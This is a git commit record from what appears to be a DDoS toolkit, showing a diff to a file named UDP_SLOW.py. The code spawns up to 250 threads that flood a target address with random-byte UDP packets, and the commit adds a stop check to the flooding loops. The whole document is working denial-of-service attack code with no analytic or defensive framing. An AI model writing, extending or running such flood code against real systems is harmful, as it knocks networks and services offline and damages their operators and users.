110d6028378961495b30f14d391a01d9d9d95ef6
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2024-05-11 13:13:43 +0700

    Update UDP_SLOW.py

--- methods/UDP_SLOW.py
+++ methods/UDP_SLOW.py
@@ -6,6 +6,7 @@ def UDP_ATTACK(s,size,addr):
         bytes_loader = os.urandom(size)
         bytes_loader2 = bytearray(os.urandom(size))
         for _ in range(2500):
+         if read() == True:break
          [s.sendto(bytes_loader,(addr)) for _ in range(5)]
          [s.sendto(bytes_loader2,(addr)) for _ in range(5)]
     except:
@@ -14,6 +15,7 @@ def UDP_ATTACK(s,size,addr):
 def SOC(addr,size):
   try:
      for _ in range(250):
+      if read() == True:break
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
   except:pass
